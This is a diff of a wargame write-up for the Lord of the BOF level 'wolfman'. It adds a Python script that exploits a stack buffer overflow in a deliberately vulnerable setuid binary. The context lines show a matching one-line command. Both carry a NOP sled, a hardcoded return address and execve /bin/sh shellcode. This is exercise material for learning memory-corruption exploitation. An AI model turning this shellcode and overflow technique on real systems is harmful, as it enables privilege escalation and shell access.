@@ -3,7 +3,7 @@ title: "[LOB]Level05. wolfman"
 tags: [LOB, writeup]
 author: eli_ez3r
 key: 20180829
-modify_date: 2019-10-07
+modify_date: 2019-11-13
 article_header:
   type: cover
   image:
@@ -97,6 +97,33 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 
 ```
 ./wolfman `python -c 'print "A"*44+"\x64\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+```
+
+-----
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/orc/wolfman"
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+shellcode_addr = 0xbffffa64
+
+payload = "\x90"*44
+payload = append(p32(shellcode_addr))
+payload = append("\x90"*50)
+payload = append(shellcode)
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
 ```
 
 -----
